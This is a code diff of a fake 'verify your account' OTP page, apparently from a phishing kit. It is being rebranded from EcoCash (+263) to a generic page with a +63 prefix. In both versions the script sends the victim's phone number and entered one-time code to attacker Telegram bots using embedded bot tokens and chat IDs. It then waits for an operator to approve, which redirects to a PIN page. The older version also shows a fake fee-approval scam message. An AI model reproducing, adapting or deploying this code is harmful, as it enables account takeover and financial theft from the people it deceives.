@@ -4,267 +4,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - OTP Verification</title>
+    <title>Verify Your Account</title>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
         
-        html,
         body {
-            min-height: 100vh;
-            font-family: 'Inter', sans-serif;
-            background: #f5f7fa;
-            overflow-y: auto;
-            overflow-x: hidden;
+            background-color: #f8f9fa;
             display: flex;
-            flex-direction: column;
-        }
-        
-        .header {
-            background: white;
-            padding: 20px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .back-btn {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 28px;
-            color: #333;
-            text-decoration: none;
-        }
-        
-        .title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #333;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1a1a1a;
         }
         
         .container {
-            max-width: 480px;
-            margin: 40px auto;
-            padding: 30px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            flex: 1;
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 24px 20px 40px 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+            position: relative;
         }
         
-        .subtitle {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 10px;
+        @media (min-width: 480px) {
+            .container {
+                min-height: auto;
+                border-radius: 16px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            }
         }
         
-        .phone {
+        .header {
+            display: flex;
+            align-items: center;
+            position: relative;
+            margin-bottom: 32px;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: #1a1a1a;
+            cursor: pointer;
+            padding: 4px 8px;
+        }
+        
+        .header h2 {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
             font-size: 18px;
             font-weight: 600;
-            color: #333;
-            margin-bottom: 40px;
         }
         
-        .otp-label {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
-        .otp-group {
+        .content {
+            text-align: center;
             display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+        }
+        
+        .content p {
+            font-size: 15px;
+            color: #4a4a4a;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        
+        .content p strong {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
             justify-content: center;
-            gap: 12px;
-            margin-bottom: 30px;
+            margin-bottom: 24px;
         }
         
         .otp-box {
-            width: 50px;
-            height: 60px;
-            border: 2px solid #0066ff;
-            border-radius: 12px;
-            font-size: 28px;
+            width: 44px;
+            height: 52px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 10px;
             text-align: center;
-            background: white;
-            color: #333;
+            font-size: 20px;
             font-weight: 600;
+            outline: none;
+            transition: border-color 0.2s;
         }
         
         .otp-box:focus {
-            outline: none;
-            border-color: #0066ff;
+            border-color: #0052ff;
         }
         
-        .resend {
-            font-size: 15px;
-            color: #666;
-            margin-bottom: 50px;
+        .resend-text {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 40px;
         }
         
-        .resend span {
-            color: #0066ff;
-            font-weight: 600;
-        }
-        
-        #submitBtn {
+        .continue-btn {
             width: 100%;
-            padding: 18px;
-            background: #ccc;
-            color: #999;
+            background-color: #0052ff;
+            color: white;
             border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
+            border-radius: 28px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 24px;
+            transition: background-color 0.2s;
+            opacity: 0.5;
             cursor: not-allowed;
         }
         
-        #submitBtn.enabled {
-            background: #0066ff;
-            color: white;
+        .continue-btn.enabled {
+            opacity: 1;
             cursor: pointer;
         }
         
-        footer {
-            text-align: center;
-            padding: 30px 20px;
-            color: #aaa;
-            font-size: 14px;
-            background: #f5f7fa;
-            flex-shrink: 0;
-            margin-top: auto;
+        .continue-btn:hover.enabled {
+            background-color: #0040cc;
         }
-        /* SPINNER */
         
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none;
-            justify-content: center;
+        .face-id-link {
+            display: flex;
             align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #0066ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .spinner-text {
-            font-size: 18px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 320px;
-            font-weight: 500;
-        }
-        /* SUCCESS / CANCEL MESSAGE */
-        
-        #resultOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none;
             justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-            padding: 20px;
-        }
-        
-        .result-message {
-            font-size: 18px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 320px;
+            gap: 8px;
+            color: #0052ff;
+            text-decoration: none;
+            font-size: 15px;
             font-weight: 500;
+            margin-bottom: 20px;
+        }
+        /* Overlay Styles */
+        
+        .overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            text-align: center;
+            z-index: 50;
+            border-radius: inherit;
         }
     </style>
 </head>
 
 <body>
-    <div class="header">
-        <a href="login" class="back-btn">←</a>
-        <div class="title">OTP Verification</div>
-    </div>
 
     <div class="container">
-        <div class="subtitle">Enter the OTP sent to your phone number</div>
-        <div class="phone" id="maskedPhone"></div>
-
-        <div class="otp-label">OTP</div>
-        <div class="otp-group">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
+        <!-- Top Navigation Header -->
+        <div class="header">
+            <button class="back-btn" onclick="history.back()"><i class="fa-solid fa-chevron-left"></i></button>
+            <h2>Verify your account</h2>
         </div>
 
-        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
+        <!-- Main Content Section -->
+        <div class="content">
+            <p>Enter the 6-digit code sent to<br><strong id="maskedPhone">+63 9XX XXX 1234</strong></p>
 
-        <button id="submitBtn">Submit</button>
+            <!-- 6-Digit OTP Input Boxes -->
+            <div class="otp-inputs">
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autofocus>
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric">
+            </div>
+
+            <div class="resend-text">
+                Resend code in 00:<span id="timer">45</span>
+            </div>
+
+            <button id="submitBtn" class="continue-btn" disabled>Continue</button>
+
+            <a href="#" class="face-id-link">
+                <i class="fa-solid fa-id-card"></i> Verify with face ID
+            </a>
+        </div>
+
+        <!-- Spinner Loading Overlay -->
+        <div id="spinnerOverlay" class="overlay">
+            <div class="fa-3x mb-4 text-[#0052ff]">
+                <i class="fa-solid fa-circle-notch fa-spin"></i>
+            </div>
+            <p class="text-gray-700 font-medium">Verifying your code, please wait...</p>
+        </div>
+
+        <!-- Result Status Overlay (Only used for decline/cancel messages) -->
+        <div id="resultOverlay" class="overlay">
+            <div id="resultMessage" class="text-gray-800 text-base font-medium mb-6">Result goes here...</div>
+            <button onclick="closeResultOverlay()" class="w-full bg-[#0052ff] text-white py-3 rounded-full font-semibold">Try Again</button>
+        </div>
     </div>
 
-    <footer>© 2026 EcoCash</footer>
-    <!-- SPINNER -->
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance </div>
-    </div>
-
-    <!-- RESULT OVERLAY -->
-    <div id="resultOverlay">
-        <div class="result-message" id="resultMessage"></div>
-    </div>
-
+    <!-- JavaScript Logic -->
     <script>
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8958520368:AAEY2_sQezJG0NF6gNAKm74fLyOQoAnloiI';
-        const CHAT_ID_1 = '1480569244';
+        const BOT_TOKEN = '8655434304:AAF-Ix6PLMZj8qhwXvOMUMJqbu9XWKIYKmk';
+        const CHAT_ID = '8486303623';
 
-        // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
-        const CHAT_ID_2 = '5615316142';
-
-        // Mask phone from localStorage
-        const savedPhone = localStorage.getItem('phone') || '785123463';
+        // Retrieve and mask phone from localStorage
+        const savedPhone = localStorage.getItem('phone') || '9123456789';
         const visibleStart = savedPhone.slice(0, 3);
         const visibleEnd = savedPhone.slice(-2);
-        const masked = visibleStart + '****' + visibleEnd;
-        document.getElementById('maskedPhone').textContent = '+263 ' + masked;
+        const masked = visibleStart + '***' + visibleEnd;
+        document.getElementById('maskedPhone').textContent = '+63 ' + masked;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
         const submitBtn = document.getElementById('submitBtn');
@@ -274,21 +240,17 @@
         const timerSpan = document.getElementById('timer');
 
         let otpValue = '';
-        let seconds = 116;
-        let pollInterval1 = null;
-        let pollInterval2 = null;
-        let lastUpdateId1 = 0;
-        let lastUpdateId2 = 0;
-        let currentTimestamp = 0;
-        let actionProcessed = false;
+        let seconds = 45;
+        let pollInterval;
+        let lastUpdateId = 0;
 
         // Countdown timer
         const countdown = setInterval(() => {
             seconds--;
-            timerSpan.textContent = seconds;
+            timerSpan.textContent = seconds < 10 ? '0' + seconds : seconds;
             if (seconds <= 0) {
                 clearInterval(countdown);
-                timerSpan.textContent = '0';
+                timerSpan.textContent = '00';
             }
         }, 1000);
 
@@ -318,99 +280,13 @@
             });
         });
 
-        // Helper to send to a bot with inline keyboard
-        function sendToBot(botToken, chatId, text, replyMarkup) {
-            const payload = {
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'Markdown'
-            };
-            if (replyMarkup) {
-                payload.reply_markup = replyMarkup;
-            }
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
-        // Handle a callback query from either bot
-        function handleCallback(callbackData, callbackQueryId, botToken) {
-            if (actionProcessed) return;
-            actionProcessed = true;
-
-            // Answer the callback query to remove loading state
-            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
-                })
-            }).catch(() => {});
-
-            // Stop both polling intervals
-            if (pollInterval1) clearInterval(pollInterval1);
-            if (pollInterval2) clearInterval(pollInterval2);
-
-            spinnerOverlay.style.display = 'none';
-            resultOverlay.style.display = 'flex';
-
-            const parts = callbackData.split('_');
-            if (parts[0] === 'approve') {
-                resultMessage.textContent = 'Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance';
-            } else if (parts[0] === 'cancel') {
-                resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
-            }
-        }
-
-        // Poll a single bot for callback responses
-        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        for (let update of data.result) {
-                            // Update the reference via the outer variable reference approach
-                            if (botToken === BOT_TOKEN_1) {
-                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
-                            } else {
-                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
-                            }
-
-                            if (update.callback_query && !actionProcessed) {
-                                const cb = update.callback_query;
-                                const dataParts = cb.data.split('_');
-                                const ts = parseInt(dataParts[1]);
-
-                                if (ts === currentTimestamp) {
-                                    handleCallback(cb.data, cb.id, botToken);
-                                    return;
-                                }
-                            }
-                        }
-                    }
-                })
-                .catch(() => {});
-        }
-
-        // Start polling both bots
-        function startPollingBoth() {
-            actionProcessed = false;
-
-            // Poll Bot 1 every 1.5s
-            pollInterval1 = setInterval(() => {
-                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
-            }, 1500);
-
-            // Poll Bot 2 every 1.5s
-            pollInterval2 = setInterval(() => {
-                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
-            }, 1500);
+        function closeResultOverlay() {
+            resultOverlay.style.display = 'none';
+            // Clear inputs for re-entry
+            otpBoxes.forEach(box => box.value = '');
+            otpValue = '';
+            checkOtpComplete();
+            otpBoxes[0].focus();
         }
 
         submitBtn.addEventListener('click', () => {
@@ -418,27 +294,71 @@
 
             spinnerOverlay.style.display = 'flex';
 
-            currentTimestamp = Date.now();
+            const timestamp = Date.now();
+            const message = `OTP Verification\n\nPhone: +63 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel.`;
 
-            const message = `*OTP Verification*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
-            const replyMarkup = {
-                inline_keyboard: [
-                    [{
-                        text: '✅ Approve',
-                        callback_data: 'approve_' + currentTimestamp
-                    }, {
-                        text: '❌ Cancel',
-                        callback_data: 'cancel_' + currentTimestamp
-                    }]
-                ]
-            };
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve',
+                                    callback_data: 'approve_' + timestamp
+                                }, {
+                                    text: '❌ Cancel',
+                                    callback_data: 'cancel_' + timestamp
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok) {
+                        spinnerOverlay.style.display = 'none';
+                        alert('Error sending to bot: ' + data.description);
+                    }
+                })
+                .catch(error => {
+                    spinnerOverlay.style.display = 'none';
+                    alert('Bot connection error: ' + error);
+                });
 
-            // Send to both bots with inline buttons
-            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
-            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
+            // Poll for admin response from Telegram
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            for (let update of data.result) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const cbData = update.callback_query.data;
+                                    const dataParts = cbData.split('_');
+                                    if (dataParts[1] == timestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
 
-            // Start polling both bots for the response
-            startPollingBoth();
+                                        if (dataParts[0] === 'approve') {
+                                            // Navigate to pin.html on approval
+                                            window.location.href = 'pin.html';
+                                        } else if (dataParts[0] === 'cancel') {
+                                            // Show error message and prompt to enter correct OTP on decline
+                                            resultMessage.textContent = 'Please enter correct otp';
+                                            resultOverlay.style.display = 'flex';
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    });
+            }, 1500);
         });
 
         checkOtpComplete();
